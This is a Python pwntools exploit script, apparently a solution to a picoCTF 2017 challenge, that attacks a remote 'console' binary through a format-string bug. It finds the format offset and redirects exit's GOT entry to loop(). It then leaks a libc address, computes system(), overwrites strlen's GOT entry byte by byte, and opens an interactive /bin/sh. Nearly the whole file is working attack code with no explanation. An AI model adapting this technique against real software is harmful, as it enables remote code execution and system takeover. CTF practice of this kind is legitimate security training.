#!/usr/bin/env python

#@author Guil-T

from pwn import *
context.clear(arch = 'amd64')

def exec_fmt(payload):
    #p = process(['./console','log.log'])
    p = remote('shell2017.picoctf.com', 45115)
    p.sendline('e ' + payload)
    print p.recvuntil('Exit message set!\n')
    received = p.recvall()
    print '%r' % received
    return received
    

    
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
log.success('offset @ %d' % offset)

# overwrite exit with loop()
#p = process(['./console','log.log'])
p = remote('shell2017.picoctf.com', 45115)
#gdb.attach(p, 'b* 0x40090f')
#gdb.attach(p)

e = ELF('./console')
loopaddr = e.symbols['loop']
exit_got = e.got['exit']
log.info('Writing 0x%x @ 0x%x' %(loopaddr,exit_got))
payload = fmtstr_payload(offset, {exit_got: loopaddr})
payload = 'X' + '%76$2492c' + '%19$hn' + cyclic(22) + p64(exit_got)

print '%r' % payload
p.sendline('e ' + payload)

def exec_fmt2(payload):
    p.recvuntil('action:')
    p.sendline('e ' + payload)
    print p.recvuntil('START')
    received = p.recvuntil('END')[:-3]
    print '%r' % received
    return received
    
libcleak = exec_fmt2('%p%pSTART%pEND')
libcleak = int(libcleak,16)
log.success('libcleak : 0x%x' % libcleak)

#libcbase = libcleak - 0xdbbc0  #local
libcbase = libcleak - 0xdbc00   #remote

#libcsystem = libcbase + 0x3f870    #local
libcsystem = libcbase + 0x41490     #remote
log.success('libcsystem : 0x%x' % libcsystem)

def writeByte(byte, where):
    log.info('Wrtiting 0x%x @ 0x%x' %(ord(byte), where))
    return 'X%76${:04d}c%19$hhn'.format(ord(byte)-1) + cyclic(21) + p64(where)

libcsystemstr = p64(libcsystem)

for i in range(6):
    p.sendline('e ' + writeByte(libcsystemstr[i], e.got['strlen']+i ))

p.sendline('p /bin/sh')
p.interactive()